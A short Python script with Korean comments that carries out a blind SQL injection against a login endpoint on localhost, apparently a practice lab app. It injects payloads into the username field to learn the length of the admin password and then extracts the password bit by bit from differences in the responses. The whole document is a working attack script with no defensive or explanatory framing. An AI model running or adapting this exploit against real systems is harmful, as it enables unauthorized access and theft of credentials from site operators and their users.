import requests

url = "http://127.0.0.1:5000/login"
username = 'admin'
# 비밀번호 컬럼 길이 찾기
password_length = 0
while True:
    payload = f"{username}' AND (SELECT CHAR_LENGTH(password) FROM Users where username = '{username}') = {password_length} # "
    data = {'username': payload, 'password': 'dummy'}
    response = requests.post(url, data=data)
    if 'Query Result: (' in response.text:
        break
    else:
        password_length += 1
print(f"Password length is: {password_length}\n")
# password 찾기
for i in range(1, password_length+1):
    password = ''
    for bit in range(7, -1, -1):
        payload = f"{username}' AND (ord(substr(password,{i},1)) & {2**bit}) <> 0 # "
        data = {'username': payload, 'password': 'dummy'}
        response = requests.post(url, data=data)
        if 'Query Result: (' in response.text:
            password += '1'
        else:
            password += '0'
    password_char = chr(int(password, 2)).encode('latin1').decode('utf8')
    print(password_char, end='', flush=True)